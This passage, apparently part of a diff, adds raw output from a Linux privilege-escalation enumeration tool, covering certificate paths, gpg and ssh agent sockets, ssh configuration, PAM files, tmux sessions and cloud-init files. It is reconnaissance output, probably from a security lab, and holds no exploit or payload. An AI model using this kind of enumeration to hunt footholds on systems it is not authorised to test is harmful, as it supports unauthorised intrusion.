+/snap/core18/2246/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
+/snap/core18/2246/etc/ssl/certs/AffirmTrust_Premium.pem
+/snap/core18/2246/etc/ssl/certs/Amazon_Root_CA_1.pem
+/snap/core18/2246/etc/ssl/certs/Amazon_Root_CA_2.pem
+/snap/core18/2246/etc/ssl/certs/Amazon_Root_CA_3.pem
+/snap/core18/2246/etc/ssl/certs/Amazon_Root_CA_4.pem
+/snap/core18/2246/etc/ssl/certs/Atos_TrustedRoot_2011.pem
+/snap/core18/2246/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
+/snap/core18/2246/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
+/snap/core18/2246/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
+/snap/core18/2246/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
+/snap/core18/2246/etc/ssl/certs/ca-certificates.crt
+44268PSTORAGE_CERTSBIN
+
+gpg-connect-agent: no running gpg-agent - starting '/usr/bin/gpg-agent'
+gpg-connect-agent: waiting for the agent to come up ... (5s)
+gpg-connect-agent: connection to agent established
+══╣ Writable ssh and gpg agents
+/etc/systemd/user/sockets.target.wants/gpg-agent.socket                                                    
+/etc/systemd/user/sockets.target.wants/gpg-agent-ssh.socket
+/etc/systemd/user/sockets.target.wants/gpg-agent-extra.socket
+/etc/systemd/user/sockets.target.wants/gpg-agent-browser.socket
+══╣ Some home ssh config file was found
+/usr/share/openssh/sshd_config                                                                             
+Include /etc/ssh/sshd_config.d/*.conf
+ChallengeResponseAuthentication no
+UsePAM yes
+X11Forwarding yes
+PrintMotd no
+AcceptEnv LANG LC_*
+Subsystem       sftp    /usr/lib/openssh/sftp-server
+
+══╣ /etc/hosts.allow file found, trying to read the rules:
+/etc/hosts.allow                                                                                           
+
+Searching inside /etc/ssh/ssh_config for interesting info
+Include /etc/ssh/ssh_config.d/*.conf
+Host *
+    SendEnv LANG LC_*
+    HashKnownHosts yes
+    GSSAPIAuthentication yes
+
+╔══════════╣ Analyzing PAM Auth Files (limit 70)
+drwxr-xr-x 2 root root 4096 Sep 24 16:20 /etc/pam.d                                                        
+-rw-r--r-- 1 root root 2133 Jul 23  2021 /etc/pam.d/sshd
+
+╔══════════╣ Searching tmux sessions
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions                     
+tmux 3.0a                                                                                                  
+
+/tmp/tmux-1001
+╔══════════╣ Analyzing Cloud Init Files (limit 70)
+-rw-r--r-- 1 root root 3619 May 11  2021 /etc/cloud/cloud.cfg                                              
+     lock_passwd: True
+-rw-r--r-- 1 root root 3704 Oct  7  2021 /snap/core18/2246/etc/cloud/cloud.cfg
